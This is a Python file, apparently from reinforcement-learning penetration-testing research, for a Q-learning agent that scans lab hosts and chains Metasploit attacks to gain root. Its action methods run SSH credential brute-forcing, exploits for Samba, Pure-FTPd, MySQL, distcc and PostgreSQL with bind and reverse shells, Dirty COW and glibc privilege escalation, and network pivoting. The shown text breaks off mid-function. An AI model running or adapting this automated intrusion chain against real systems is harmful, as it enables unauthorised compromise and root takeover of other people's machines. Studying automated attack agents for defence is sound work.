# coding=utf-8

import numpy as np
import pandas as pd
import time
import re
import ast
#from metasploit.msfrpc import MsfRpcClient
#from metasploit.msfconsole import MsfRpcConsole
from SimulationEnvironment import Simulation1
from SimulationEnvironment import Simulation2


class QLearningTable:
        
    def __init__(self, victim_ip_address, local_ip_address, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9, simulation=False):
        self.actions = self.initialise_all_actions().keys()  # a list
        self.all_actions= self.initialise_all_actions()
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon = e_greedy
        self.q_tables = {}
        self.q_table = pd.DataFrame(columns=self.actions, dtype=np.float64)
        self.initial_victim_ip_address= victim_ip_address
        self.current_victim_ip_address= victim_ip_address
        self.local_ip_address= local_ip_address
        self.simulation= simulation
        if simulation:
            #self.simulation_environment= Simulation1()
            #self.simulation_environment= Simulation2(["192.168.56.101","192.168.56.102","192.168.56.103","192.168.56.104","192.168.56.105","192.168.56.106","192.168.56.107","192.168.56.108","192.168.56.109"],"192.168.56.109","192.168.56.101")
            self.simulation_environment= Simulation2(["192.168.56.101","192.168.56.102","192.168.56.103","192.168.56.104","192.168.56.105","192.168.56.106","192.168.56.107","192.168.56.108"],"192.168.56.108","192.168.56.101")
        self.global_positive_out = list()
        self.global_console_status = False
        self.nmap_dict={}
        self.success=False
        self.whoami= 'Not root'
        self.action_in_the_right_shell= True
        self.session='0'
        self.session_regex= re.compile("session ([0-9]+)")
        self.action_iteration= 0
        self.neighbors= []
        self.nmap_ports_launched= 0
        self.nmap_hosts_launched= 0
        self.victim_number= 0
        self.host_seems_down_nmap_ports= False
        self.no_active_jobs= False
        
        #self.log = open('/home/yassir/Bureau/log.txt','a')
        
        #self.client = MsfRpcClient('password')
        #self.console = MsfRpcConsole(self.client, cb=self.read_console)
    
        
    def read_console(self, console_data):
        self.global_console_status = console_data['busy']
        print('\nReading real console\n')
        #print global_console_status
        
        if '[+]' in console_data['data']:
            sigdata = console_data['data'].rstrip().split('\n')
            for line in sigdata:
                    if '[+]' in line:
                    		self.global_positive_out.append(line)
                            
#        if (('Nmap scan report' in console_data['data']) and (self.nmap_ports_launched== 1)) or ( 'Interesting ports' in console_data['data']): # REVOIR LA DEUXIEME PARTIE DU OR, C'EST POUR GERER LE nmap_ports DANS METASPLOITABLE
#            print('hazhlbfezlbl')
#            self.traitement_nmap_ports(console_data['data'])
#            self.nmap_ports_launched= 0
#            
#        if ('nmap -sV' in console_data['data']) or ( ('nmap' in console_data['data']) and ('-sP' not in console_data['data']) ): # REVOIR DEUXIEME PARTIE DU OR, C'EST POUR GERER LE nmap_ports DANS METASPLOITABLE
#            self.nmap_ports_launched= 1
        
        if all(x in console_data['data'] for x in ['PORT','STATE']):
            self.traitement_nmap_ports(console_data['data'])
            
        if (('Nmap scan report' in console_data['data']) and (self.nmap_hosts_launched== 1)) or ('appears to be up' in console_data['data']): # VOIR SI C'EST OK POUR LA DEUXIEME PARTIE DU OR
            self.traitement_nmap_hosts(console_data['data'])
            self.nmap_hosts_launched= 0
            
        if 'nmap -sP' in console_data['data']:
            self.nmap_hosts_launched= 1
                            
        if any(x in console_data['data'] for x in ['Success','opened','Route added','Added route']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.success= True
            #print('success='+ str(success))
        elif any(x in console_data['data'] for x in ['Invalid', 'no session', 'failed']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.success= False
        else:
            print('\nSUCCESS UNKNOWN\n')
            # on laisse donc le self.success d'avant qui a du coup plus de chance d'être correct
             
        if ("root" in console_data['data']):
            self.whoami = 'root'
        else:
            self.whoami = 'Not root'
         
        current_session= self.session_regex.search(console_data['data'])
        if (current_session != None) and (int(current_session.group(1)) > int(self.session)):
            self.session= current_session.group(1)
            print("\nSESSION: "+ str(self.session) + "\n")
            
        if any(x in console_data['data'] for x in ['Unknown','not found','No such file or directory', 'Usage','failed']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.action_in_the_right_shell= False
        else:
            self.action_in_the_right_shell= True
            
        if 'Host seems down' in console_data['data']: #j'aurai préféré mettre ce if dans la fonction 'traitement_nmap_ports'
            self.host_seems_down_nmap_ports= True
        else:
            self.host_seems_down_nmap_ports= False
            
        if 'No active jobs' in console_data['data']: #j'aurai préféré mettre ce if dans la fonction 'traitement_nmap_ports'
            self.no_active_jobs= True
        else:
            self.no_active_jobs= False
            
        
        # try:
        #     self.log=open('/home/yassir/Bureau/log.txt','a')
        # except BaseException:
        #     print('Fichier log deja ouvert')
        # self.log.write(console_data['data'])
        # self.log.close()
        
        print(console_data['data'])
        
    def read_simulated_console(self, console_data):
        print('\nReading simulated console\n')
                              
#        if (('Nmap scan report' in console_data['data']) and (self.nmap_ports_launched== 1)) or ( 'Interesting ports' in console_data['data']): # REVOIR LA DEUXIEME PARTIE DU OR, C'EST POUR GERER LE nmap_ports DANS METASPLOITABLE
#            print('hazhlbfezlbl')
#            self.traitement_nmap_ports(console_data['data'])
#            self.nmap_ports_launched= 0
#            
#        if ('nmap -sV' in console_data['data']) or ( ('nmap' in console_data['data']) and ('-sP' not in console_data['data']) ): # REVOIR DEUXIEME PARTIE DU OR, C'EST POUR GERER LE nmap_ports DANS METASPLOITABLE
#            self.nmap_ports_launched= 1
        
        if all(x in console_data for x in ['PORT','STATE']):
            self.traitement_nmap_ports(console_data)
            
        if 'nmap -sP' in console_data:
            self.nmap_hosts_launched= 1
            
        if (('Nmap scan report' in console_data) and (self.nmap_hosts_launched== 1)) or ('appears to be up' in console_data): # VOIR SI C'EST OK POUR LA DEUXIEME PARTIE DU OR
            self.traitement_nmap_hosts(console_data)
            self.nmap_hosts_launched= 0
                            
        if any(x in console_data for x in ['Success','opened','Route added','Added route']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.success= True
            #print('success='+ str(success))
        elif any(x in console_data for x in ['Invalid', 'no session', 'failed']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.success= False
        else:
            print('\nSUCCESS UNKNOWN\n')
            # on laisse donc le self.success d'avant qui a du coup plus de chance d'être correct
             
        if ("root" in console_data):
            self.whoami = 'root'
        else:
            self.whoami = 'Not root'
         
        current_session= self.session_regex.search(console_data)
        if (current_session != None) and (int(current_session.group(1)) > int(self.session)):
            self.session= current_session.group(1)
            print("\nSESSION: "+ str(self.session) + "\n")
            
        if any(x in console_data for x in ['Unknown','not found','No such file or directory', 'Usage','failed']): # EST CE LA BONNE MANIERE DE FAIRE ?
            self.action_in_the_right_shell= False
        else:
            self.action_in_the_right_shell= True
            
        if 'Host seems down' in console_data: #j'aurai préféré mettre ce if dans la fonction 'traitement_nmap_ports'
            self.host_seems_down_nmap_ports= True
        else:
            self.host_seems_down_nmap_ports= False
            
        if 'No active jobs' in console_data: #j'aurai préféré mettre ce if dans la fonction 'traitement_nmap_ports'
            self.no_active_jobs= True
        else:
            self.no_active_jobs= False
            
        
        # try:
        #     self.log=open('/home/yassir/Bureau/log.txt','a')
        # except BaseException:
        #     print('Fichier log deja ouvert')
        #self.log.write(console_data)
        #self.log.close()
        
        print(console_data)
        
        #time.sleep(10)
        
        
        
    def initialise_all_actions(self):
        # retourne un dictionnaire { str(action): action}
        return {
                str(self.background): self.background,
                str(self.ssh_login): self.ssh_login,
                #str(self.samba): self.samba,
                str(self.ftp1): self.ftp1,
                str(self.mysql): self.mysql,
                str(self.dirtyCow): self.dirtyCow,
                #str(self.ls): self.ls,
                str(self.distcc): self.distcc,
                #str(self.postgresql): self.postgresql,
                #str(self.pivot_autoroute): self.pivot_autoroute,
                str(self.pivot_autoroute_4): self.pivot_autoroute_4,
                str(self.glibc_origin_expansion_priv_esc): self.glibc_origin_expansion_priv_esc
                }

    def choose_action(self, observation):
        print('\nOBSERVATION: ' + str(observation))
        self.check_state_exist(observation)
        # action selection
        if np.random.uniform() < self.epsilon:
            # choose best action
            state_action = self.q_table.loc[observation, :]
            print("\nSTATE ACTION: ")
            print(state_action)
            # some actions may have the same value, randomly choose on in these actions
            action = self.all_actions[np.random.choice(state_action[state_action == np.max(state_action)].index)]
            print("\nACTION: ")
            print(action)
        else:
            # choose random action
            action = self.all_actions[np.random.choice(list(self.actions))]
            
        print("\nACTION: " + str(action))
        #self.success='Unknown'
        return action

    def learn(self, s, a, r, s_):
        self.check_state_exist(s_)
        q_predict = self.q_table.loc[s, str(a)]
        if s_ != 'terminal':
            q_target = r + self.gamma * self.q_table.loc[s_, :].max()  # next state is not terminal
        else:
            q_target = r  # next state is terminal
        self.q_table.loc[s, str(a)] += self.lr * (q_target - q_predict)  # update

    def check_state_exist(self, state):
        if state not in self.q_table.index:
            # append new state to q table
            self.q_table = self.q_table.append(
                pd.Series(
                    [0]*len(self.actions),
                    index=self.q_table.columns,
                    name=state,
                )
            )
                    
    def step(self, action, observation):
        #print(type(action))
        #time.sleep(2)
        
        #preparation de l'etat suivant
        self.action_iteration +=1
        past_observation_dict= ast.literal_eval(observation)
        observation_dict = ast.literal_eval(observation)
        observation_dict['victim_'+str(self.victim_number)]['action '+ str(self.action_iteration)]=str(action)
        
        #lancement de l'action et récupération des résultats
        print(str(type(action)))
        if str(type(action))=="<class 'method'>":
            (success2, whoami2)= action()
        if str(type(action))=="<class 'str'>":
            (success2, whoami2)= self.change_ip(action, observation_dict, past_observation_dict)
            
        self.success= False # AVEC CETTE REINITIALISATION EST CE TOUJOURS NECESSAIRE DE CHANGER LE self.success à FALSE DANS LA FONCTION 'read_console' ? 

        #time.sleep(20) # modifier, pas bon de faire comme ça
        
        # reward function
        if whoami2 == 'root':
            reward = 1 
            done = True
            s_ = 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (whoami2 != 'root') and (success2==True) : # à optimiser
            #reward = -0.0001    # VERIFIER S'IL FAUT LAISSER COMME CA
            reward=0
            done = False
            s_ = str(observation_dict)  # voir comment récuperer la string 'ssh_login' de la fonction dont le nom est ssh_login()
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (success2 == False): # à optimiser
            reward = -1
            done = True
            s_= 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
            
#        else:
#            reward = 0
#            done = False
        
        #if self.simulation==True:
            #time.sleep(10)
        
        return s_, reward, done
    
    
    
    # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
    def reinitialization(self):
        if self.simulation==False:
            self.console.execute('sessions -K') #on termine toute les sessions metasploit ouvertes
            time.sleep(4)
            self.console.execute('jobs -K') #on efface toutes les routes créees
            time.sleep(4)
            self.console.execute('route flush') #on efface toutes les routes créees
            time.sleep(3)
            
            
            self.current_victim_ip_address= self.initial_victim_ip_address
            self.nmap_dict={}
            self.action_iteration= 0
            #self.all_actions= self.initialise_all_actions()
            #self.neighbors= [self.initial_victim_ip_address]
            #self.session= 0 # il ne faut pas réinitialiser ! car metasploit ne réinitialise pas le numerotage des sessions même après les avoir fermées
            self.victim_number= 0
            return
        
        else:
            self.simulation_environment.reinitialization()
            
            self.current_victim_ip_address= self.initial_victim_ip_address
            self.nmap_dict={}
            self.action_iteration= 0
            #self.all_actions= self.initialise_all_actions()
            #self.neighbors= [self.initial_victim_ip_address]
            #self.session= 0 # il ne faut pas réinitialiser ! car metasploit ne réinitialise pas le numerotage des sessions même après les avoir fermées
            self.victim_number= 0
        
        
    def nmap_ports(self): # à considérer comme une action à part ou pas ?
        if self.simulation==False:
            print('nmap ports en cours ... \n')
            self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions
            
            if not ( 'victim_'+str(self.victim_number) in self.nmap_dict.keys() ):
                self.nmap_dict['victim_'+str(self.victim_number)]={}
            
            self.console.execute('nmap ' + self.current_victim_ip_address)  # probleme du nmap -sV sur metasploitable
            time.sleep(20)
            self.nmap_dict['victim_'+str(self.victim_number)]['victim_ip_address']= self.current_victim_ip_address # on ajoute l'addresse ip de la victim dans l'état observé, faut-il ajouté l'ip locale aussi ?
            return str(self.nmap_dict)
        
        else:
            print('nmap ports en cours ... \n')
            self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions
            
            if not ( 'victim_'+str(self.victim_number) in self.nmap_dict.keys() ):
                self.nmap_dict['victim_'+str(self.victim_number)]={}
            
            result= self.simulation_environment.nmap_ports(self.current_victim_ip_address)
            self.read_simulated_console(result)
            
            self.nmap_dict['victim_'+str(self.victim_number)]['victim_ip_address']= self.current_victim_ip_address # on ajoute l'addresse ip de la victim dans l'état observé, faut-il ajouté l'ip locale aussi ?
            return str(self.nmap_dict)
    
    def nmap_hosts(self): # à considérer comme une action à part ou pas ?
        if self.simulation==False:
            print('nmap hosts en cours ... \n')
            #self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions
            self.console.execute('nmap -sP 192.168.56.0/24') # A MODIFIER L'IP EN DUR
            time.sleep(55)
            
            # on ajoute les actions de changements d'adresses ip (enfait on ajoute seulement les adresses ip sous forme de string ici)
            #ici on ajoute à notre q_table les colonnes correspondants aux action qu'on vient de découvrir
            for elt in self.neighbors:
                #if elt not in self.actions:
                if elt not in self.q_table.columns: # VERIFIER QUE CE 'if' MARCHE BIEN
                    self.q_table[elt]=0
            #print('\nq_table\n')
            #print(self.q_table)
            print('\n')
            
            #ici on met à jour notre self.actions pour que, lors de l'ajout de nouveaux etats dans notre q_table dans la fonction check_state_exists, on aie aussi les actions qu'on vient de découvrir
            self.all_actions= self.initialise_all_actions()
            for elt in self.neighbors:
                self.all_actions[elt]=elt
            self.actions = self.all_actions.keys()
            print('ACTIONS \n')
            print(self.actions)
            print('\n')
            
            return
        
        else:
            print('nmap hosts en cours ... \n')
            #self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions

            result= self.simulation_environment.nmap_hosts()
            self.read_simulated_console(result)
            
            # on ajoute les actions de changements d'adresses ip (enfait on ajoute seulement les adresses ip sous forme de string ici)
            #ici on ajoute à notre q_table les colonnes correspondants aux action qu'on vient de découvrir
            for elt in self.neighbors:
                #if elt not in self.actions:
                if elt not in self.q_table.columns: # VERIFIER QUE CE 'if' MARCHE BIEN
                    self.q_table[elt]=0
            #print('\nq_table\n')
            #print(self.q_table)
            print('\n')
            
            #ici on met à jour notre self.actions pour que, lors de l'ajout de nouveaux etats dans notre q_table dans la fonction check_state_exists, on aie aussi les actions qu'on vient de découvrir
            self.all_actions= self.initialise_all_actions()
            for elt in self.neighbors:
                self.all_actions[elt]=elt
            self.actions = self.all_actions.keys()
            print('ACTIONS \n')
            print(self.actions)
            print('\n')
            
            return
    
    def traitement_nmap_ports(self, resultat_nmap):
        print('\ntraitement_nmap_ports\n')
        #fonction qui transforme la string renvoyée par la commande nmap en un dictionnaire {'numero_port': 'opened|closed'}
        a = re.compile(r"^([0-9]+)")
        b = re.compile(r"open|closed")
        
        for elt in resultat_nmap.split('\n'):
            if a.search(elt) != None and b.search(elt) != None:
                self.nmap_dict['victim_'+str(self.victim_number)][a.search(elt).group(0)+'_ip'+str(self.victim_number)]=b.search(elt).group(0)
                
    def traitement_nmap_hosts(self, resultat_nmap):
        a = re.compile(r"Host is up")
        b = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")
        d= re.compile(r"Host \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} appears to be up.")
    
        for index,elt in enumerate(resultat_nmap.split('\n')):
            if (a.search(elt) != None): # on recherche le 'Host is up'
                c= b.search(resultat_nmap.split('\n')[index-1]).group(0) #on récupère l'adresse ip correspondante au 'Host is up'
                if (c != self.local_ip_address) and (c not in self.neighbors): # l'adresse ip doit etre differente de self.local_ip_address et de self.current_victim_ip_address il me semble, à corriger donc
                    self.neighbors.append(c)
            if (d.search(elt) != None): # "Host \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} appears to be up."
                c= b.search(elt).group(0)
                if (c != self.local_ip_address) and (c not in self.neighbors) and (c != '192.168.56.100'): # l'adresse ip doit etre differente de self.local_ip_address et de self.current_victim_ip_address il me semble, à corriger donc, A REVOIR LES DERNIER AND
                    self.neighbors.append(c)
        print('neighbors ' + str(self.neighbors))
        
    def change_ip(self, ip, observation_dict, past_observation_dict):
        
        print('PAST IPs \n')
        print([past_observation_dict[victim]['victim_ip_address'] for victim in past_observation_dict.keys()])
        print('\n')
        if (ip != self.current_victim_ip_address) and (ip not in [past_observation_dict[victim]['victim_ip_address'] for victim in past_observation_dict.keys()]) :  # DEUXIEME CONDITION A VERIFIER, ET VERIFIER AUSSI SI past_observation_dict EST VRAIMENT UTILE
        #faut il changer  le 'self.local_ip_address' aussi ? (pour les cas ou on se connecte à une machine victime 2 à partir d'une autre machine victime 1 par exemple)
            print('TEST')
            self.current_victim_ip_address= ip
            self.victim_number+=1
            a=ast.literal_eval(self.nmap_ports())
            if self.host_seems_down_nmap_ports== True:
                self.victim_number-=1
                return False, 'Not root'
            
            for elt in a.keys():
                if elt not in observation_dict.keys():
                    observation_dict[elt]=a[elt] # on ajoute les nouveaux éléments retournés par nmap_port à l'observation courante
            #self.nmap_hosts() # est ce vraiment necessaire de faire un 'nmap hosts' ?
            print(str(observation_dict))
            
            return True, 'Not root'
        
        else:
            return False, 'Not root'
    
    def background(self): # met le shell sur la machine attaquée (s'il existe) en background
        if self.simulation==False:
            print(self.global_console_status)
            self.console.execute('background')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('y')
                time.sleep(2)
                return True, 'Not root'
            
    #        elif self.global_console_status: # à modifier surement, cet "elif" est fait pour l'action 'postgresql' et n'est pas forcément général
    #            while( c==False ):
    #                self.console.execute('exit')
    #                time.sleep(4)
    #                self.console.execute('background')
    #                time.sleep(10)
    #                c= self.action_in_the_right_shell    
            
            else:
                return False, 'Not root'
        
        else:
            result= self.simulation_environment.background()
            self.read_simulated_console(result)
            c= self.action_in_the_right_shell
            
            if c:
                return True, 'Not root'
            
    #        elif self.global_console_status: # à modifier surement, cet "elif" est fait pour l'action 'postgresql' et n'est pas forcément général
    #            while( c==False ):
    #                self.console.execute('exit')
    #                time.sleep(4)
    #                self.console.execute('background')
    #                time.sleep(10)
    #                c= self.action_in_the_right_shell    
            
            else:
                return False, 'Not root'
            
    
    def ssh_login(self):
        if self.simulation==False:
            RPORT='22'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                self.console.execute('use auxiliary/scanner/ssh/ssh_login')
                time.sleep(15)
                c= self.action_in_the_right_shell
                
                if c:
                    self.console.execute('set RHOSTS ' + self.current_victim_ip_address)
                    time.sleep(4)
                    self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
                    time.sleep(4)
                    self.console.execute('set STOP_ON_SUCCESS true')
                    time.sleep(4)
                    self.console.execute('run')
                    time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
                
                    a= self.success
                    
                    if a: # EST CE ENVISAGEABLE DE METTRE CE IF EN TANT QU'ACTION A PART ?
                        self.console.execute('sessions -i ' + str(self.session))
                        time.sleep(4)
                        self.nmap_hosts()
                        time.sleep(4)
                        self.console.execute('whoami')
                        time.sleep(4)
                    
                    b= self.whoami
                
                    #while self.global_console_status:
                    #while console.console.read()['busy']:
                    #time.sleep(2)
                    return a, b
                
                else:
                    return False, 'Not root'
            
            return False, 'Not root'
    
        else:
            RPORT='22'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                result= self.simulation_environment.ssh_login(self.current_victim_ip_address)
                self.read_simulated_console(result)
                
                c= self.action_in_the_right_shell
                
                if c:
 
                    a= self.success
                    
                    if a:
                        self.nmap_hosts()
                    
                    b= self.simulation_environment.whoami()
                
                    #while self.global_console_status:
                    #while console.console.read()['busy']:
                    #time.sleep(2)
                    return a, b
                
                else:
                    return False, 'Not root'
            
            return False, 'Not root'
            
            
    def samba(self):
        RPORT='139'+'_ip'+str(self.victim_number)
        
        if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/multi/samba/usermap_script')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOST ' + self.current_victim_ip_address)
                time.sleep(4)
                self.console.execute('set payload cmd/unix/bind_netcat')
                time.sleep(4)
                self.console.execute('exploit')
                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                a= self.success
                #print(a)
                
                if a:
                    self.nmap_hosts()
                    time.sleep(15)
                    self.console.execute('whoami')
                    time.sleep(4) #sans le sleep il y a des problemes d'ordre d'execution
                
                b= self.whoami
                
    #            if a:
    #                time.sleep(3) 
    #                self.console.execute('background')
    #                time.sleep(3)
    #                self.console.execute('y')
                
                return a, b
            
            else:
                return False, "Not root"
        
        return False, "Not root"
        
    def ftp1(self):
        if self.simulation == False:
            RPORT='21'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
                time.sleep(10)
                c= self.action_in_the_right_shell
                
                if c:
                    self.console.execute('set RHOST ' + self.current_victim_ip_address)
                    time.sleep(4)
                    self.console.execute('exploit')
                    time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                    a= self.success
                    
                    if a:
                        self.nmap_hosts()
                        time.sleep(15)
                        self.console.execute('whoami')
                        time.sleep(4)
                        
                    b= self.whoami
                    
                    return a, b
                
                else:
                    return False, 'Not root'
            
            return False, 'Not root'
        
        else:
            RPORT='21'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                result= self.simulation_environment.ftp1(self.current_victim_ip_address)
                self.read_simulated_console(result)
                
                c= self.action_in_the_right_shell
                
                if c:
                    a= self.success
                    
                    if a:
                        self.nmap_hosts()
                        
                    b= self.simulation_environment.whoami()
                    
                    return a, b
                
                else:
                    return False, 'Not root'
            
            return False, 'Not root'
    
    def mysql(self):
        if self.simulation == False:
            RPORT='3306'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
                time.sleep(10)
                c= self.action_in_the_right_shell
                
                if c:
                    self.console.execute('set RHOST ' + self.current_victim_ip_address)
                    time.sleep(4)
                    self.console.execute('exploit')
                    time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                    a= self.success
                    
                    if a:
                        self.nmap_hosts()
                        time.sleep(15)
                        self.console.execute('whoami')
                        time.sleep(4)
                    
                    b= self.whoami
                
                    return a, b
                
                else:
                    return False, 'Not root'
                
            return False, 'Not root'
        
        else:
            RPORT='3306'+'_ip'+str(self.victim_number)
            
            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                result= self.simulation_environment.mysql(self.current_victim_ip_address)
                self.read_simulated_console(result)
                
                c= self.action_in_the_right_shell
                
                if c:
                    a= self.success
                    
                    if a:
                        self.nmap_hosts()
                    
                    b= self.simulation_environment.whoami()
                
                    return a, b
                
                else:
                    return False, 'Not root'
                
            return False, 'Not root'
        
        
    def distcc(self):
        if self.simulation == False:
            RPORT='3632'+'_ip'+str(self.victim_number)
            
            try:
                if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                    self.console.execute('use exploit/unix/misc/distcc_exec')
                    time.sleep(10)
                    c=self.action_in_the_right_shell
                    
                    if c:
                        self.console.execute('set RHOSTS ' + self.current_victim_ip_address)
                        time.sleep(3)
                        self.console.execute('exploit')
                        time.sleep(15)
                        a=self.success
                        
                        if a:
                            self.nmap_hosts()
                            time.sleep(15)
                            self.console.execute('whoami')
                            time.sleep(4)
                        
                        b= self.whoami
                    
                        return a, b
                    
                    else:
                        return False, 'Not root'
                
                return False, 'Not root'
            
            except BaseException:
                print('An error was raised !')
                return False, 'Not root'
        
        else:
            RPORT='3632'+'_ip'+str(self.victim_number)
            
            try:
                if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
                    result= self.simulation_environment.distcc(self.current_victim_ip_address)
                    self.read_simulated_console(result)
                    
                    c=self.action_in_the_right_shell
                    
                    if c:
                        
                        a=self.success
                        
                        if a:
                            self.nmap_hosts()
                        
                        b= self.simulation_environment.whoami()
                    
                        return a, b
                    
                    else:
                        return False, 'Not root'
                
                return False, 'Not root'
            
            except BaseException:
                print('An error was raised !')
                return False, 'Not root'
        
    def postgresql(self):
        RPORT='5432'+'_ip'+str(self.victim_number)
        
        if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/linux/postgres/postgres_payload')
            time.sleep(10)
            c=self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOSTS ' + self.current_victim_ip_address)
                time.sleep(3)
                self.console.execute('set payload linux/x86/shell_reverse_tcp')
                time.sleep(3)
                self.console.execute('set LHOST ' + self.local_ip_address) # A MODIFIER
                time.sleep(3)
                self.console.execute('exploit')
                time.sleep(20)
                a=self.success
                
                if a:   
                    self.nmap_hosts()
                    time.sleep(15)
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                return a, b
            
            else:
                return False, 'Not root'
        
        return False, 'Not root'
        
    
    def dirtyCow(self):  # suite de ssh_login
        if self.simulation==False:
            self.console.execute('/tmp/cow')
            time.sleep(10) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
            c= self.action_in_the_right_shell
            
            if c:
                time.sleep(70)
                self.console.execute('/usr/bin/passwd')
                time.sleep(4)  # utile?
                self.console.execute('whoami')
                time.sleep(4)
                b= self.whoami
    #            self.console.execute('background') # à modifier ?
    #            time.sleep(4)
    #            self.console.execute('y') # à modifier ?
                
                # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
                if b=='root':
                    return True, 'root'
                else: 
                    return False, 'Not root'
                
            else:
                return False, 'Not root'
            
        else:
            result=self.simulation_environment.dirtyCow()
            self.read_simulated_console(result)
            
            c= self.action_in_the_right_shell
            
            if c:
                b= self.simulation_environment.whoami()
    #            self.console.execute('background') # à modifier ?
    #            time.sleep(4)
    #            self.console.execute('y') # à modifier ?
                
                # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
                if b=='root':
                    return True, 'root'
                else: 
                    return False, 'Not root'
                
            else:
                return False, 'Not root'
        
    def glibc_origin_expansion_priv_esc(self):
        if self.simulation == False:
            if self.session >0:
                self.background() # A REVOIR, self.background EST UNE ACTION A PART, IL FAUT PAS LA METTRE DANS UNE AUTRE ACTION
                self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
                time.sleep(4)
                self.console.execute('set session ' + str(self.session))
                time.sleep(4)
                self.console.execute('run')
                time.sleep(20)
                
                a= self.success
                    
                if a:
                    #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
                    self.console.execute('sessions -i ' + str(self.session))
                    time.sleep(4)
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                #while self.global_console_status:
                #while console.console.read()['busy']:
                #time.sleep(2)
                return a, b
                
            else:
                return False, 'Not root'
            
        else: # A REVOIR
            if int(self.session) >0:
                result=self.simulation_environment.glibc_origin_expansion_priv_esc()
                self.read_simulated_console(result)
                
                a= self.success
                
                b= self.simulation_environment.whoami()
            
                #while self.global_console_status:
                #while console.console.read()['busy']:
                #time.sleep(2)
                return a, b
                
            else:
                return False, 'Not root'
        
    def pivot_autoroute(self):
        #self.console.execute('sessions -u '+ str(self.session))
        self.console.execute('use multi/manage/shell_to_meterpreter')
        time.sleep(4)
        self.console.execute('set LPORT 45530')  # LAISSER CE LPORT ??
        time.sleep(4)
        self.console.execute('set session '+ self.session)
        time.sleep(4)
        self.console.execute('run')
        time.sleep(25) 
        #TOUTE CETTE PREMIERE PARTIE JE PEUX LA METTRE DANS UNE FONCTION A PART
        
        a= self.success
        c= self.action_in_the_right_shell
        
        if a and c:
            print('\n1\n')
            self.console.execute('use post/multi/manage/autoroute')
            time.sleep(8)
            self.console.execute('set subnet 192.168.56.0') # A MODIFIER, IL FAUT UN ATTRIBUT self.subnet
            time.sleep(4)
            self.console.execute('set session '+ str(self.session))
            time.sleep(4)
            self.console.execute('run')
            time.sleep(25)
            a= self.success
            
            if a:
                return True, 'Not root'
            else:
                return False, 'Not root'
            
        else:
            print('\n2\n')
            return False, 'Not root'
        
    def pivot_autoroute_2(self):
        #self.console.execute('sessions -u '+ str(self.session))
        self.console.execute('use multi/manage/shell_to_meterpreter')
        time.sleep(8)
        
        c= self.action_in_the_right_shell
        
        if c:
            self.console.execute('set LPORT 46550')  # LAISSER CE LPORT ??
